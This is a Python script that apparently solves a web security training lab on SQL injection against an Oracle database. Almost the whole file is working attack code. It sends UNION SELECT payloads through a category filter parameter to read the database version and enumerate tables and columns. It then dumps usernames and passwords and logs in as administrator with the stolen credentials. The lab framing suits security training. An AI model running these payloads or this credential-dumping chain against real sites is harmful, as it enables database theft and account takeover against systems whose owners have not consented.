# SQL injection attack, listing the database contents on Oracle

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
from bs4 import BeautifulSoup


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(s, url):
	r = s.get(url, verify=False, proxies=proxies)
	time.sleep(1)
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token:\t%s' % csrf)
	return csrf


def send_payload(url, payload):
	injection_uri = url + payload
	r = requests.get(injection_uri, verify=False, proxies=proxies)
	time.sleep(1)
	print('[+] Using payload:\t%s\n' % payload)
	if r.status_code == 500:
		print('[-] Server Respond with an INTERNAL SERVER ERROR')
		exit(-1)
	else:
		return r

def get_version(url):
	filter_path = url + '/filter?category='
	payload = "' UNION SELECT banner, NULL FROM v$version--"
	print('\n[+] Trying to retrieve the Version of the database...')
	r = send_payload(filter_path, payload)
	res = r.text
	if r.status_code == 200:
		version = re.search("<th>(.*)</", res).group(1)
		return version
	else:
		return False

def get_table_names(url):
	filter_path = url + '/filter?category='
	sql_payload = "' UNION SELECT table_name, NULL FROM all_tab_columns--"
	print('\n[+] Trying to retrieve the Users Table in the database...')

	r = send_payload(filter_path, sql_payload)
	res = r.text
	if r.status_code == 200:
		soup = BeautifulSoup(r.content, 'html.parser')

		table = soup.find(text=re.compile('^USERS_.*'))
		return table
	else:
		return False

def get_columns(url, table):
	filter_path = url + '/filter?category='
	sql_payload = "' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = '%s'--" % table
	print('\n[+] Trying to retrieve the Columns of the %s table...' % table)

	r = send_payload(filter_path, sql_payload)
	res = r.text
	if r.status_code == 200:
		columns = re.findall("<th>(.*)</", res)
		return columns
	else:
		return False

def get_creds(url, table, columns):
	print('\n[+] Trying to retrieve the Users Credentials in the database...')
	filter_path = url + '/filter?category='
	if 'passw' in columns[0]:
		pass_col = columns[0]
		user_col = columns[1]
	else:
		pass_col = columns[1]
		user_col = columns[0]
	sql_payload = "' UNION SELECT %s, %s FROM %s--" % (user_col, pass_col, table)
	r = send_payload(filter_path, sql_payload)
	res = r.text
	if r.status_code == 200:
		creds = re.findall("""<th>(.*)</th>
                            <td>(.*)</td>""", res)
		result = []
		for cred in creds:
			formated_cred = "%s:%s" % (cred[1], cred[0])
			print('Found credentials:\t %s' % formated_cred)
			result.append(formated_cred)
		return result
	else:
		return False

def connect_as_admin(url, cred):
	print('\n[+] Trying to login as Administrator with found credentials...')
	login_path = url + '/login'
	s = requests.Session()
	csrf_token = get_csrf_token(s, login_path)

	username = cred.split(':')[0]
	password = cred.split(':')[1]
	login_data = {"username": username, "password": password, "csrf": csrf_token}
	r = s.post(login_path, data=login_data, verify=False, proxies=proxies)
	time.sleep(1)
	res = r.text
	if 'Your username is: administrator' in res:
		return r.text
	else:
		return False


def main():
	print('[+] Lab: SQL injection attack, listing the database contents on Oracle')
	try:
		url = sys.argv[1].strip()
		payload = sys.argv[2].strip()
	except IndexError:
		print('[+] Usage: %s <URL> <PAYLOAD>' % sys.argv[0])
		print('[+] Example: %s https://www.target.com "\' UNION SELECT NULL, NULL"' % sys.argv[0])
		print('[+] Example: %s https://www.target.com SOLUTION\t\t(solve the lab)' % sys.argv[0])
		sys.exit(-1)
	r = requests.get(url, verify=False, proxies=proxies, allow_redirects=False)
	time.sleep(1)
	if '<h1>Error</h1>' in r.text:
		print('\n[-] HOST seems to be down (or proxy missconfigued) <!>')
		sys.exit(-1)
	if payload != "SOLUTION":
		filter_path = url + '/filter?category='
		r = send_payload(filter_path, payload).text
		print(r)
	else:
		version = get_version(url)
		time.sleep(1)
		if not version:
			print('\n[-] Exploit Failed to get the version <!>')
			sys.exit(-1)
		else:
			print('[+] Database version:\t%s' % version)
		
		table = get_table_names(url)
		time.sleep(1)
		if not table:
			print('\n[-] Exploit Failed to get the table names <!>')
			sys.exit(-1)
		else:
			print('[+] Found table:\t%s' % table)
		columns = get_columns(url, table)
		if not columns:
			print('\n[-] Exploit Failed to get the table names <!>')
			sys.exit(-1)
		else:
			print('[+] Found Columns:\t%s' % columns)
		creds = get_creds(url, table, columns)
		if not creds:
			print('\n[-] Exploit Failed to get the content of the database <!>')
			sys.exit(-1)
		else:
			for cred in creds:
				if 'admin' in cred:
					if not connect_as_admin(url, cred):
						print('\n[-] Exploit Failed to connect as Admin <!>')
					else:
						print('\n[+] The Exploit has sucessfully connected as Admin !')
				

if __name__ == "__main__":
	main()
